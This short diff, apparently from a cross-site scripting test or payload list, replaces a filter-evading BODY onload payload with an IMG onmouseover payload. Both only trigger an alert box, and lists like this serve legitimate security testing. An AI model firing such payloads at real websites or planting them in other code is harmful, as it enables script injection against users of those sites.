@@ -1,1 +1,1 @@
-<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<IMG SRC=# onmouseover="alert('xxs')">
